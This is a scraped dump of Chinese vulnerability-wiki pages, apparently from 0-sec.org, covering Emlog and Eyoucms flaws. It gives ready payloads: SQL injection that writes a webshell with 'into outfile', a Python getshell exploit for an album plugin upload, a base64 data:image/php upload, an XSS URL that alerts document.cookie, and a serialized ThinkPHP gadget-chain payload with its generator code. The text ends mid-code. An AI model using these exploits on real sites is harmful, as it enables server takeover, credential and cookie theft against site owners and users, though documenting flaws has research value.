window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Emlog/4.html":{"url":"0day/Emlog/4.html","title":"Emlog phpinfo 泄漏","keywords":"","body":"Emlog phpinfo 泄漏 一、漏洞简介 需要登陆（至少是网站的会员/作者权限） 二、漏洞影响 三、复现过程 首先看看漏洞出现的位置： 如上图，我们只要构造如下的URL： http://www.0-sec.org:81/admin/index.php?action=phpinfo 直接访问： 四、参考链接 http://www.jeepxie.net/article/687123.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 16:29:44 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Emlog/5.html":{"url":"0day/Emlog/5.html","title":"Emlog 友情链接自助插件存在SQL注入漏洞","keywords":"","body":"Emlog 友情链接自助插件存在SQL注入漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 在该插件当中的link_web.php文件中，直接将用户提交的数据进行了拼接，之后直接带入了查询，未经过任何的过滤操作，由此一个典型的SQL注入漏洞就这样简易的诞生了： 由于这里的参数都没有经过过滤，所以我们可以对任意参数进行验证，进行SQL注入，首先我们可以提交正常的访问请求，之后使用burpsuite进行抓包，之后改包，我们这里以URL为例： 在抓取到数据包之后，我们可以将url改为以下内容： url=http://0-sec.org' union select 1,2,3,4,5,'' into outfile 'c:\\\\phpstudy\\\\www\\\\shell.php' 之后，这条语句会正常执行，同时也会在C:\\phpstudy\\www\\下生成一个shell.php，而且该shell.php中的内容正是我们之前写入的一句话，之后我们可以使用菜刀进行连接。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 17:09:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Emlog/6.html":{"url":"0day/Emlog/6.html","title":"Emlog 相册插件前台SQL注入+Getshell","keywords":"","body":"Emlog 相册插件前台SQL注入+Getshell 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 首先安装Emlog的相册的插件 安装之后可以在目录：emlog\\src\\content\\plugins\\kl_album下找到所有的安装文件： 之后我们分析Kl-album_ajax_do.php文件 ini_set('memory_limit', $kl_album_memory_limit); } define('KL_UPLOADFILE_MAXSIZE', kl_album_get_upload_max_filesize()); define('KL_UPLOADFILE_PATH', '../../../content/plugins/kl_album/upload/'); define('KL_IMG_ATT_MAX_W', 100);//图片附件缩略图最大宽 define('KL_IMG_ATT_MAX_H', 100);//图片附件缩略图最大高 $att_type = array('jpg', 'jpeg', 'png', 'gif');//允许上传的文件类型 $album = isset($_POST['album']) ? intval($_POST['album']) : ''; if($_FILES['Filedata']['error'] != 4){ $upfname = kl_album_upload_file($_FILES['Filedata']['name'], $_FILES['Filedata']['error'], $_FILES['Filedata']['tmp_name'], $_FILES['Filedata']['size'], $_FILES['Filedata']['type'], $att_type); $photo_size = chImageSize(EMLOG_ROOT.substr($upfname, 2), KL_IMG_ATT_MAX_W, KL_IMG_ATT_MAX_H); $result = $DB->query(\"INSERT INTO \".DB_PREFIX.\"kl_album(truename, filename, description, album, addtime, w, h) VALUES('{$_FILES['Filedata']['name']}', '{$upfname}', '\".date('Y-m-d', time()).\"', {$album}, \".time().\", {$photo_size['w']}, {$photo_size['h']})\"); if($result){ $new_id = $DB->insert_id(); $the_option_value = Option::get('kl_album_'.$album); if($the_option_value !== null){ $the_option_value = trim($new_id.','.$the_option_value, ','); Option::updateOption('kl_album_'.$album, $the_option_value); $CACHE->updateCache('options'); } } } exit; } if(ROLE != 'admin') exit('access deined!'); 根据上面的代码，我们可以看到验证身份的代码在上传文件的后面，所以任意用户可以实现文件上传，那么之后我们再看看上传部分看看到底是如何进行验证或者对文件进行过滤的，这里面定义了一个$att_type = array('jpg', 'jpeg', 'png', 'gif');，并且将$att_type 这个变量和$_FILE一起传入了kl_album_upload_file函数 unction kl_album_upload_file($filename, $errorNum, $tmpfile, $filesize, $filetype, $type, $isIcon = 0){ $kl_album_config = unserialize(Option::get('kl_album_config')); $extension = strtolower(substr(strrchr($filename, \".\"),1)); $uppath = KL_UPLOADFILE_PATH . date(\"Ym\") . \"/\"; $fname = md5($filename) . date(\"YmdHis\") . rand() .'.'. $extension; $attachpath = $uppath . $fname; if(!is_dir(KL_UPLOADFILE_PATH)){ umask(0); $ret = @mkdir(KL_UPLOADFILE_PATH, 0777); if($ret === false) return '创建文件上传目录失败'; } if(!is_dir($uppath)){ umask(0); $ret = @mkdir($uppath, 0777); if($ret === false) return \"上传失败。文件上传目录(content/plugins/kl_album/upload)不可写\"; } doAction('kl_album_upload', $tmpfile); //缩略 $imtype = array('jpg','png','jpeg','gif'); $thum = $uppath.\"thum-\". $fname; $attach = in_array($extension, $imtype) && function_exists(\"ImageCreate\") && kl_album_resize_image($tmpfile,$filetype,$thum,$isIcon,KL_IMG_ATT_MAX_W,KL_IMG_ATT_MAX_H) ? $thum : $attachpath; $kl_album_compression_length = isset($kl_album_config['compression_length']) ? intval($kl_album_config['compression_length']) : 1024; $kl_album_compression_width = isset($kl_album_config['compression_width']) ? intval($kl_album_config['compression_width']) : 768; if($kl_album_compression_length == 0 || $kl_album_compression_width == 0){ if(@is_uploaded_file($tmpfile)){ if(@!move_uploaded_file($tmpfile ,$attachpath)){ @unlink($tmpfile); return \"上传失败。文件上传目录(content/plugins/kl_album/upload)不可写\"; }else{ echo 'kl_album_successed'; } chmod($attachpath, 0777); } }else{ if(in_array($extension, $imtype) && function_exists(\"ImageCreate\") && kl_album_resize_image($tmpfile,$filetype,$attachpath,$isIcon,$kl_album_compression_length,$kl_album_compression_width)){ echo 'kl_album_successed'; }else{ if(@is_uploaded_file($tmpfile)){ if(@!move_uploaded_file($tmpfile ,$attachpath)){ @unlink($tmpfile); return \"上传失败。文件上传目录(content/plugins/kl_album/upload)不可写\"; }else{ echo 'kl_album_successed'; } chmod($attachpath, 0777); } } } $attach = substr($attach, 6, strlen($attach)); return $attach; } 从上面的代码中我们发现，对于之前传入的$_type这个变量在这个函数里根本就没有起到任何左右，函数中定义的$imtype = array('jpg','png','jpeg','gif');，也不是用来验证后缀的，而是判断是否需要生成缩略图的，所以重点就是下面的内容了： $extension = strtolower(substr(strrchr($filename, \".\"),1)); $uppath = KL_UPLOADFILE_PATH . date(\"Ym\") . \"/\"; $fname = md5($filename) . date(\"YmdHis\") . rand() .'.'. $extension; $attachpath = $uppath . $fname; ... ... ... if(@!move_uploaded_file($tmpfile ,$attachpath)){ 这里我们可以发现上传的文件名是： $fname = md5($filename) . date(\"YmdHis\") . rand() .'.'. $extension; 这里的意思是将原来的文件名的md5值+当前时间+rand随机数+后缀，md5值和时间基本上比较好确定，但是这个rand（）随机数一般都是0-65535之间，非常麻烦。 同时我们可以看到下面的代码，并没有把问卷名输出的地方，只是echo 'kl_album_successed';。难道，我们需要暴力破解shell名字？ 我们返回kl_album_ajax_do.php，可以发现上传的if语句中有如下代码： $result = $DB->query(\"INSERT INTO \".DB_PREFIX.\"kl_album(truename, filename, description, album, addtime, w, h) VALUES('{$_FILES['Filedata']['name']}', '{$upfname}', '\".date('Y-m-d', time()).\"', {$album}, \".time().\", {$photo_size['w']}, {$photo_size['h']})\"); 这里将$_FILES['Filedata']['name']直接插入数据库。这里另造成了一个SQL注入漏洞，当然既然有之前的getshell，这里的注入就有点当陪衬了。不过emlog在遇到SQL语句出错的情况下是会报错的。 所以所以，这里我们正好用到这个特性，通过报错可以将$upfname这个字段爆出来，这也就是我们上传成功的shell名字。 如何报错？上传文件名里加个单引号即可。 漏洞复现 target url > shell file > 保存为html，本地打开： 填入目标url，并选择要上传的shell。（如图，我这里是info'.php，会令SQL出错）。点击GO! 之后可以发现出错了，可以发现文件名已经爆出来了：../content/plugins/kl_album/upload/201411/38493d4468377f721357e9c64f93637d2014111211381611097.php 访问可见shell： 这里给出独自等待的一份payload： #!/usr/bin/env python # -*- coding: gbk -*- # -*- coding: utf-8 -*- # Date: 2015/4/30 # Created by 独自等待 # 博客 http://www.waitalone.cn/ import sys, os, re, time try: import requests except ImportError: raise SystemExit('\\n[!] requests模块导入错误,请执行pip install requests安装!') def usage(): # os.system(['clear', 'cls'][os.name == 'nt']) print '+' + '-' * 60 + '+' print '\\t Python emlog相册插件getshell exploit' print '\\t Blog：http://www.waitalone.cn/' print '\\t\\t Code BY： 独自等待' print '\\t\\t Time：2015-04-30' print '+' + '-' * 60 + '+' if len(sys.argv) != 2: print '用法: ' + os.path.basename(sys.argv[0]) + ' EMLOG 网站地址' print '实例: ' + os.path.basename(sys.argv[0]) + ' http://www.waitalone.cn/' sys.exit() def getshell(url): ''' emlog相册插件上传getshell函数 :param url: emlog url地址 :return: 返回得到的shell地址 ''' up_url = url + 'content/plugins/kl_album/kl_album_ajax_do.php' shell = \"\" filename = \"oneok'.php\" with open(filename, 'wb') as shellok: shellok.write(shell) files = { 'Filedata': (filename, open(filename, 'rb'), 'text/json'), 'album': (None, 'waitalone.cn') } try: up_res = requests.post(up_url, files=files).content shellok = re.findall(re.compile(r'(?四、参考链接 https://blog.csdn.net/Fly_hps/article/details/80582751 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 17:17:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Emlog/3.html":{"url":"0day/Emlog/3.html","title":"Emlog 6.0 后台暴力破解","keywords":"","body":"Emlog 6.0 后台暴力破解 一、漏洞简介 Emlog博客系统默认后台登陆地址为http://域名/admin/login.php而后台登陆时，错误情况下，验证码未刷新，导致可暴力破解登陆管理员账号低危漏洞，但是在emlog5.3.1和6.0测试版本均存在 ... 二、漏洞影响 emlog5.3.1和6.0 三、复现过程 访问 http://0-sec.org:81/admin/ 已知管理员用户名为：admin（可在前端文章页寻找作者用户名） 登陆后台 随便输入admin admin123 qdiwx，点击登陆 然后burpsuite抓包 CTRL+I尝试暴力破解： 成功爆破出密码，所以再次验证：验证码没消除会话，导致可暴力破解漏洞的存在 四、参考链接 http://www.dyboy.cn/post-900.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 16:23:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Emlog/7.html":{"url":"0day/Emlog/7.html","title":"Emlog 6.0 xss集合","keywords":"","body":"Emlog 6.0 xss集合 一、漏洞简介 二、漏洞影响 Emlog 6.0 三、复现过程 Uploadify SWF XSS Emlog使用了 uploadify.swf 的方式上传文件，文件路径 /include/lib/js/uploadify/uploadify.swf payload http://www.0-sec.org/include/lib/js/uploadify/uploadify.swf?uploadifyID=00%22%29%29;}catch%28e%29{alert%281%29;}//%28%22&movieName=%22])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//&.swf 效果，可无视浏览器filter： 反射xss 此处的XSS主要发生在cookie上，因为某些页面如 admin/admin_log,admin/sort.php,admin/link.php页面需要在表单中添加了hidden属性的token值，而这个token值直接从用户的cookie中取得，导致了一个反射型XSS 拦截抓包修改cookie中的token值如下： 效果： 侧边栏存储性XSS 为了同样是为了支持HTML代码的输出，没有转义对应的脚本代码标签，导致了存储性的XSS存在 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 18:34:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Emlog/2.html":{"url":"0day/Emlog/2.html","title":"Emlog 6.0 数据库备份与导入功能导致后台getshell","keywords":"","body":"Emlog 6.0 数据库备份与导入功能导致后台getshell 一、漏洞简介 二、漏洞影响 Emlog 三、复现过程 备份数据库到本地： 修改数据库文件，将备份的数据库文件进行修改，在最后一段添加上自己构造的SQL语句： 这一段sql语句主要功能是：首先判断是否存在emlog_shell数据表，如果存在则删除该表，之后创建一个新的emlog数据表，之后再向该表中添加信息（这里可以填入一句话木马），之后使用select..... into outfile ....将数据表中的表项内容读入到一个shell.php的PHP文件汇总，之后再删除该数据表！ 导入数据库： 之后访问之： 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 16:18:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Emlog/1.html":{"url":"0day/Emlog/1.html","title":"Emlog 越权&后台getshell","keywords":"","body":"Emlog 越权&后台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 代码分析 安装漏洞 ​ 其实一般代码审计都是从安装文件开始审计，一般安装脚本主要存在如下漏洞： 无验证功能，任意重装覆盖 表单不做过滤写入config.php导致getshell $_GET['step']跳过限制步骤 漏洞文件：install.php ​ ​首先我们直奔第一个点能否任意重装，我们可以看到必须常量DEL_INSTALLER为1的时候才会触发删除install.php,那么我们追踪DEL_INSTALLER看看 这里可以看到DEL_INSTALLER默认值就是0，所以一般情况下这里是可以任意重装的，我们从黑盒的测试也可以印证这一点。同时表单也做了过滤所以这里也没有后面两种情况。 越权漏洞 ​ ​在安装完毕后打开config.php看到两个比较奇怪的常量定义：AUTH_KEY和AUTH_COOKIE_NAME从名字来看这连个常量肯定是有一定联系的。如下图： 我们在抓包时候发现了AUTH_COOKIE_NAME这个常量，说明这是一个cookie名。我们继续再代码中追踪这个常量。 我们可以看到在登录验证cookie中使用了这个常量，我们追踪一下cookie值是如何构造的 这里可以看到，调用了emHash这个类方法，并且这里使用了AUTH_KEY这个常量，这里说明这两个常量是有联系的。我们在继续追踪hash_hmac()到底使用key做了什么。 这里对传入的$key也就是AUTH_KEY进行了md5加密到一个二进制字符串中而后分割为64个字节与一个字符*64次的字符串进行异或最后得到两个字符串$ipad,$opad最后再将他们打包拼接用md5加密返回给上级调用。我们再回到上级。 我们知道generateAuthCookie方法中的 $key、$hash是由AUTH_KEY加密而成。最终的cookie是由$user_login 、 $expiration $hash拼接而成，而$expiration是cookie的生存时间，$user_login是用户名。这里可以得知$key、$user_login、$expiration都是固定的那么只要知道AUTH_KEY就有伪造cookie造成越权的可能。 ​例如我们准备两个靶机，一个靶机登陆，获取这个靶机的cookie即可越权登陆另外一个靶机。前提是两个靶机的AUTH_KEY得一致。这里有点鸡肋但是还是有利用的可能。我们将两个靶机的cookie拿出来比较确实是一样的。 ​ ​ 后台getshell（一） ​ ​其实上诉两个漏洞已经能够让我们进入后台了，现在的任务就是如何Getshell了。这里我随便看了一下发现后台有设置上传附件后缀的功能。 ​ ​ ​ ​ 但是测试发现，加入php后缀你发现会将phpt替换为X,从源码中可有很直观看到这点。 ​ ​ ​ ​此时我注意到了备份功能，这个后缀是保存在数据库中的，既然我不能直接将后缀写入数据库，那么我能不能通过数据备份恢复的方法写入数据库呢。 ​ ​ 这里直接备份所有表，下载下来然后找到写入后缀的语句，加上php,如下 ​ ​ ​ ​ ​ ​ 导入备份后发现设置中的上传后缀有php ​ ​ ​ ​ 直接在文章发表出上传PHP文件即可getshell ​ ​ 后台getshell（二） 我们还发现这个cms中上传插件的地方可以上传zip，这里我们想如果在插件中插入一句话木马是不是也能getshell?我们找到插件上传的脚本，发现使用了一个叫emUnzip的函数。 我们继续追踪这个函数，发现这个解压函数是使用ZipArchive()类来实现解压缩的。我们可以看到代码755行中获取了压缩包的内部目录/文件的名称 ,并将其分割为数组将第一个元素赋值给了$dir，我们看到switch中plugin选项，这里又将获取的第一个文件夹名称赋值给$plugin_name,使用getFromName方法获取了压缩包是否存在$dir . $plugin_name . '.php'这个文件。综上这里就是检测压缩包中文件夹里面是否存在一个与文件夹名称一致的PHP文件，最后在再压。这里也没对文件进行其他校验操作。因此我们只要再构造 文件夹名和文件名相同的内容的压缩包，同时由上方代码也可以知道，文件将会被解压到 /content/plugins/a/a.php(文件夹名称a) 构建压缩包上传插件： 四、参考链接 https://xz.aliyun.com/t/6861 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-19 14:29:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/10.html":{"url":"0day/Eyoucms/10.html","title":"Eyoucms 1.0 前台getshell","keywords":"","body":"Eyoucms 1.0 前台getshell 一、漏洞简介 官网：http://www.eyoucms.com/download/ Cms下载地址：http://www.eyoucms.com/eyoucms1.0.zip 二、漏洞影响 三、复现过程 老样子：先讲如何利用 url: http://test.eyoucms1.0.com/index.php/api/Uploadify/preview 构造: post: data:image/php;base64,PD9waHAgcGhwaW5mbygpOw== Shell: http://test.eyoucms1.0.com/preview/ae85d74a721b0b8bd247bc31207a12e2.php 原理分析 漏洞文件： eyoucms1.0\\application\\api\\controller\\Uploadify.php 漏洞函数：preview() 这里我将每行有意义的代码都解释了一下帮助读者进行查看。 而我刚开始时也思考了一下，这会不会是作者故意搞的后门？ 带着这个问题我去问了一下加的php群的一些程序员 他们很惊讶的 表示data:image/ 居然还可以不是图片？ 好吧。到这里我就基本明白为什么这个漏洞会出现了，估计作者以为data:image/ 只能是图片。 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/kbh8mh 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-04 18:41:21 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/6.html":{"url":"0day/Eyoucms/6.html","title":"Eyoucms 1.3.5 后台getshell","keywords":"","body":"Eyoucms 1.3.5 后台getshell 一、漏洞简介 最新版本删除该功能 二、漏洞影响 Eyoucms 1.3.5 三、复现过程 漏洞分析 相关功能代码在application/admin/controller/Tools.php public function restoreUpload() { $file = request()->file('sqlfile'); if(empty($file)){ $this->error('请上传sql文件'); } // 移动到框架应用根目录/data/sqldata/ 目录下 $path = tpCache('global.web_sqldatapath'); $path = !empty($path) ? $path : config('DATA_BACKUP_PATH'); $path = trim($path, '/'); $image_upload_limit_size = intval(tpCache('basic.file_size') * 1024 * 1024); $info = $file->validate(['size'=>$image_upload_limit_size,'ext'=>'sql,gz'])->move($path, $_FILES['sqlfile']['name']); if ($info) { //上传成功 获取上传文件信息 $file_path_full = $info->getPathName(); if (file_exists($file_path_full)) { $sqls = Backup::parseSql($file_path_full); if(Backup::install($sqls)){ //array_map(\"unlink\", glob($path)); /*清除缓存*/ delFile(RUNTIME_PATH); /*--end*/ $this->success(\"执行sql成功\", url('Tools/restore')); }else{ $this->error('执行sql失败'); } } else { $this->error('sql文件上传失败'); } } else { //上传错误提示错误信息 $this->error($file->getError()); } } 上传过程中只验证了文件的大小和后缀，之后解析sql语句并执行。解析sql函数不再贴出，但并没有检测文件内容正常的sql语句都能通过解析。install函数直接执行了sql语句。 漏洞复现 登陆后台在高级选项->备份还原->数据还原可选择上传sql文件并执行 上传sql文件内容为（需要知道网站绝对路径） select '' into outfile 'D:\\\\tools\\\\phpstudy\\\\phpstudy_pro\\\\WWW\\\\testcms\\\\1.php'; 上传成功后在网站根目录生成webshell。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 14:49:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/1.html":{"url":"0day/Eyoucms/1.html","title":"Eyoucms 1.3.9 上传漏洞","keywords":"","body":"Eyoucms 1.3.9 上传漏洞 一、漏洞简介 EyouCms是基于TP5.0框架为核心开发的免费+开源的企业内容管理系统，专注企业建站用户需求提供海量各行业模板，降低中小企业网站建设、网络营销成本，致力于打造用户舒适的建站体验。易优cms v1.3.7后台插件模块存在代码执 二、漏洞影响 Weapp.php文件中的create()方法接收了请求中的参数，过滤后直接存入php配置文件中，但是由于过滤不严，导致可以直接写入代码进去并执行。 三、复现过程 1、登陆后台 在后台-----》插件应用-----》上传插件这里可以上传zip文件 在Weapp.php文件中的upload()方法中可以上传zip文件，并会自动解压到一个文件夹名是随机md5值的文件夹下 在后台开启插件功能，上传zip文件，zip中有php一句话木马以及一个任意图片(图片内容无所谓，正常图片即可，但是必须得有) 上传后，虽然会返回错误信息，但是实际上后台已经解压了zip文件 访问内容管理模块，任意选择一个产品进行编辑，再图片集处可以上传图片，选择在线管理，可以在左侧看到该文件夹名 直接访问该文件夹下的php一句话木马文件即可 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 01:21:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/5.html":{"url":"0day/Eyoucms/5.html","title":"Eyoucms 1.39 前台sql注入","keywords":"","body":"Eyoucms 1.39 前台sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 http://0-sec.org:8081/eyoucms/?m=home&c=View&a=index&aid=89 然后开启burp抓包，构建如下的包 需要改两方面的参数一是referer，改成我们访问的页面 然后将get的url构造为如下 然后放进sqlmap一把梭就行啦 代码分析 'url_screen_var'这个值=>'ZXLjbXM'，这里它cms也注释说明了这个参数代表了文章状态，在前台使用的。 ZXljbXM 这里使用这个参数是需要注册一个用户权限，正好是可以在前台使用 所以上图的refer就代表我们是从用户权限的那里过来的 根据它 ZXLjbXM 所需求的构造如下url。 GET /eyoucms/?ZXljbXM=1&a=index&c=Lists&m=home&tid=3&yanse=1 看最后的参数yanse 是它这个的cms的产品评论里的参数。本来是系统自带的 但是这个参数也是属于用户发表的文章里面的构造，所以结合ZXLjbXM 即可构造可以存在注入的url链接 它这里请求的参数没有做防护 其实它这个文件的三个参数都是可以注入但是构造的请求url不相同。通过更改最后的参数即可 如果安装者是经过调整此点，或者仅用来展示网站的，那利用点可能微乎其微了 这个注入点比较鸡肋。其实没有多少高深的东西，只是笔者运气好，恰好看见这个参数。要不真的发现不了。 因为这个文件属于它cms自带的一处产品编辑的文件，实在不容易被注意到。 四、参考链接 https://xz.aliyun.com/t/6983 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-27 01:19:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/2.html":{"url":"0day/Eyoucms/2.html","title":"Eyoucms 1.4.2 sql注入","keywords":"","body":"Eyoucms 1.4.2 sql注入 一、漏洞简介 二、漏洞影响 三、复现过程 介绍漏洞之前先了解下这套CMS，EyouCms是基于TP5.0（5.0.24）框架为核心开发的免费+开源的企业内容管理系统。 Payload: http://0-sec.org/index.php?m=user&c=pay&a=pay_recharge_detail&querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czoyNzoidXNlcnNfaWQgPSA1KSBhbmQgc2xlZXAoNSkjIjt9fQ== 漏洞文件：/EyouCMS-V1.4.2-UTF8-SP2/application/user/controller/Pay.php 漏洞函数：pay_recharge_detail public function pay_recharge_detail() { $querystr = input('param.querystr/s'); $querydata = unserialize(base64_decode($querystr)); if (!empty($querydata['moneyid']) && !empty($querydata['order_number'])) { 这莫非是？？？没错就是反序列化导致的漏洞（这里标题写了sql注入，其实更准确说应该是增删改查漏洞，如果需要再具体一点那就是THINKPHP反序列化增删改查漏洞）。这里只报错来测试下sql注入 经测试，上述的payload无法执行，因为框架源码替换了 public function __call($method, $args) { if (array_key_exists($method, self::$hook)) { array_unshift($args, $this); return call_user_func_array(self::$hook[$method], $args); } else { throw new Exception('method not exists:' . __CLASS__ . '->' . $method); } } 先说一下我们的反序列化利用点，到后面会调用__toString函数。而我们这里就可以跳过构造think\\process\\pipes\\Windows 类。直接去构造继承Model类的子类。 流程如下： toArray()代码在这（一部分） if (!empty($this->append)) { foreach ($this->append as $key => $name) { if (is_array($name)) { // 追加关联对象属性 $relation = $this->getAttr($key); $item[$key] = $relation->append($name)->toArray(); } elseif (strpos($name, '.')) { list($key, $attr) = explode('.', $name); // 追加关联对象属性 $relation = $this->getAttr($key); $item[$key] = $relation->append([$attr])->toArray(); } else { $relation = Loader::parseName($name, 1, false); if (method_exists($this, $relation)) { $modelRelation = $this->$relation(); //我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点我是重点 $value = $this->getRelationData($modelRelation); if (method_exists($modelRelation, 'getBindAttr')) { $bindAttr = $modelRelation->getBindAttr(); if ($bindAttr) { foreach ($bindAttr as $key => $attr) { $key = is_numeric($key) ? $attr : $key; if (isset($this->data[$key])) { throw new Exception('bind attr has exists:' . $key); } else { $item[$key] = $value ? $value->getAttr($attr) : null; } } continue; } } $item[$name] = $value; } else { $item[$name] = $this->getAttr($name); } } } } 心细的小伙伴可能发现了 $this->$relation(); 呸是个人都能发现好不嘞。这里可以调用当前类下所有方法。而数据库增删改查操作也是定义在Model类下。可以忽略parseName函数（无影响），但如果你非要看，呸，我就是不给你看。 首先append属性是我们可以控制的。我们只需要构造append让他进入else分支就够了。然后我们就可以执行相应的数据库操作函数。save、delete、update等。 构造利用链： append = [\"vaaa\"=>\"save\"]; $this->data = [\"username\"=>\"asda2122\"]; $this->pk = \"users\"; $this->table = \"ey_users\"; $this->field = ['users_id','username']; $this->isUpdate = true; $this->updateWhere = \"users_id = 5) and (extractvalue(1,concat(0x5c,(select user()))))#\"; } } namespace think\\model; use think\\Model; class Pivot extends Model { } use think\\model\\Pivot; $arr['moneyid'] = 1; $arr['order_number'] = new Pivot; echo base64_encode(serialize($arr)); ?> 生成Payload： http://0-sec.org/index.php?m=user&c=pay&a=pay_recharge_detail&querystr=YToyOntzOjc6Im1vbmV5aWQiO2k6MTtzOjEyOiJvcmRlcl9udW1iZXIiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo4OntzOjk6IgAqAGFwcGVuZCI7YToxOntzOjQ6InZhYWEiO3M6NDoic2F2ZSI7fXM6NzoiACoAZGF0YSI7YToxOntzOjg6InVzZXJuYW1lIjtzOjg6ImFzZGEyMTIyIjt9czo5OiIAKgBpbnNlcnQiO2E6MDp7fXM6NToiACoAcGsiO3M6NToidXNlcnMiO3M6ODoiACoAZmllbGQiO2E6Mjp7aTowO3M6ODoidXNlcnNfaWQiO2k6MTtzOjg6InVzZXJuYW1lIjt9czo4OiIAKgB0YWJsZSI7czo4OiJleV91c2VycyI7czoxMToiACoAaXNVcGRhdGUiO2I6MTtzOjE0OiIAKgB1cGRhdGVXaGVyZSI7czo2NToidXNlcnNfaWQgPSA1KSBhbmQgKGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDVjLChzZWxlY3QgdXNlcigpKSkpKSMiO319 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 14:46:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Eyoucms/3.html":{"url":"0day/Eyoucms/3.html","title":"Eyoucms 1.42 后台注入","keywords":"","body":"Eyoucms 1.42 后台注入 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 /application/admin/controller/Index.php public function changeTableVal() { if (IS_AJAX_POST) { $url = null; $data = [ 'refresh' => 0, ]; $table = input('post.table/s'); // 表名 $id_name = input('post.id_name/s'); // 表主键id名 $id_value = input('post.id_value/s'); // 表主键id值 $field = input('post.field/s'); // 修改哪个字段 $value = input('post.value/s', '', null); // 修改字段值 switch ($table) { // 会员等级表 case 'users_level': { $return = model('UsersLevel')->isRequired($id_name,$id_value,$field,$value); if (is_array($return)) { $this->error($return['msg']); } } break; // 会员属性表 case 'users_parameter': { $return = model('UsersParameter')->isRequired($id_name,$id_value,$field,$value); if (is_array($return)) { $this->error($return['msg']); } } break; // 会员中心菜单表 case 'users_menu': { Db::name('users_menu')->where('id','gt',0)->update([ 'is_userpage' => 0, 'update_time' => getTime(), ]); $data['refresh'] = 1; } break; // 会员投稿功能 case 'archives': { if ('arcrank' == $field) { if (0 == $value) { $value = -1; }else{ $value = 0; } } } break; // 会员产品类型表 case 'users_type_manage': { if (empty($value)) { $this->error('不可为空'); } } break; default: # code... break; } $savedata = [ $field => $value, 'update_time' => getTime(), ]; M($table)->where(\"$id_name = $id_value\")->cache(true,null,$table)->save($savedata); // 根据条件保存修改的数据 // 以下代码可以考虑去掉，与行为里的清除缓存重复 AppEndBehavior.php / clearHtmlCache switch ($table) { case 'auth_modular': extra_cache('admin_auth_modular_list_logic', null); extra_cache('admin_all_menu', null); break; default: // 清除logic逻辑定义的缓存 extra_cache('admin_'.$table.'_list_logic', null); // 清除一下缓存 // delFile(RUNTIME_PATH.'html'); // 先清除缓存, 否则不好预览 \\think\\Cache::clear($table); break; } /*清除页面缓存*/ // $htmlCacheLogic = new \\app\\common\\logic\\HtmlCacheLogic; // $htmlCacheLogic->clear_archives(); /*--end*/ $this->success('更新成功', $url, 